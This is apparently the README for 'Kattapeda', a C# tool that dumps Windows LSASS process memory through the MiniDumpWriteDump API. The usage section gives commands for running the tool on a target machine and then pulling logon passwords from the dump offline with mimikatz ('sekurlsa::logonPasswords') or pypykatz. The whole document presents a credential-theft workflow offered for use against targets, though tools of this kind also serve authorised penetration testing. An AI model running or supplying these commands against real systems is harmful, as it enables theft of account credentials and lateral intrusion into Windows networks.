
██╗  ██╗ █████╗ ████████╗████████╗ █████╗ ██████╗ ███████╗██████╗  █████╗ ");
██║ ██╔╝██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗");
█████╔╝ ███████║   ██║      ██║   ███████║██████╔╝█████╗  ██║  ██║███████║");
██╔═██╗ ██╔══██║   ██║      ██║   ██╔══██║██╔═══╝ ██╔══╝  ██║  ██║██╔══██║");
██║  ██╗██║  ██║   ██║      ██║   ██║  ██║██║     ███████╗██████╔╝██║  ██║");
╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚═╝     ╚══════╝╚═════╝ ╚═╝  ╚═╝");

![Version](https://img.shields.io/badge/release-1.0-yellow.svg)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](https://opensource.org/licenses/MIT)

Kattapeda is a very simple LSASS memory dump tool in C# based on Win32 `MiniDumpWriteDump` API. 
The dump file created, can be exploited offline with Mimikatz or Pypykatz.

>[!CAUTION]
> The dump will fail if the memory is LSA protected. Consequently, the created file will be empty. Check the prerequisite before running kattapeda.

### [+] USAGE
- compile the .cs source code
- on target, execute the program:
`.\kattax64.exe c:\windows\tasks\mini.dmp`
- offline, use pypykatz or mimikatz to loot the content of the lsass memory dump using:
`mimikatz # sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords`
or:
`pypykatz lsa minidump lsass.dmp`

The content of the dumped memory will be written into the file passed as argument. By default, the program uses `c:\windows\tasks\mini.dmp`




